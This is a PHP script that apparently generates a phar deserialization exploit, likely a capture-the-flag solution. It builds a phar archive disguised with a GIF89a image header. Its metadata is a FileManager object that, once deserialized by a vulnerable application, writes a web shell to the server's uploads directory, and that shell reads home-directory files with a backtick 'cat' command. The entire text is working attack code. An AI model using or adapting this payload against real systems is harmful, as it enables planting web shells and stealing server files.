<?php
$phar = new Phar('WooL.phar');
$phar->startBuffering();
$phar->addFromString('WooL.txt', '');
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
class FileManager {
    public $name = '';
    public $content = '';
    public $mode = '';
}

$object = new FileManager(null,null,null);
$object->mode = 'upload';
$object->name = '/var/www/html/uploads/WooL.php';
$object->content = '<?php echo `cat ~/*`; ?>';
$phar->setMetadata($object);
$phar->stopBuffering();
?>
